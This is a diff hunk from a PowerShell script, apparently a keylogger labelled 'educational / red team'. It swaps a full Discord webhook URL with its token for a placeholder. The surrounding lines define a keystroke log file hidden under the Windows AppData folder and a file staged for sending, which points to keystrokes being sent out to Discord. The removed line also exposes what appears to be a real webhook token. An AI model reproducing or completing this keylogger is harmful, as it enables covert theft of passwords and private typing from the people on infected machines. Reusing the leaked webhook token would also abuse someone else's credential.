@@ -2,7 +2,7 @@
 # Educational / Red Team / Authorized Testing Only
 # DO NOT use on systems you do not own or have explicit permission to test
 
-$webhookUrl = "https://discord.com/api/webhooks/1449205881085366413/UAZTDi3qQJDnJxf3ODpODtY9_wyoI7oC0IF5mLwsMWwLieGF9XJMc7E7hpP7Z_TxcGsh"
+$webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE"
 
 $logPath = "$env:APPDATA\Microsoft\Windows\keylog.txt"
 $sendPath   = "$env:APPDATA\Microsoft\Windows\mylog-send.txt"
